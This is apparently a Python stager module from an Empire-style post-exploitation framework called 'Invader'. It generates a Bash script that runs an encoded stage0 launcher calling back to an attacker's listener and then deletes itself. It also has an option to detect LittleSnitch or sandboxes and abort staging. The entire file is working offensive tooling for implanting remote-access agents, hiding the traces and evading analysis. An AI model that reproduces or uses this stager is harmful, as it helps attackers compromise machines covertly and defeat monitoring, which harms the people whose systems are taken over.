from lib.common import helpers


class payload:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BashScript',

            'Author': ['@harmj0y'],

            'Description': ('Generates self-deleting Bash script to execute the Invader stage0 launcher.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the payload, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate payload for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the payload to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'OutFile' : {
                'Description'   :   'File to output Bash script to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']

        # generate the launcher code
        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            script = "#!/bin/bash\n"
            script += "%s\n" %(launcher)
            script += "rm -f \"$0\"\n"
            script += "exit\n"
            return script
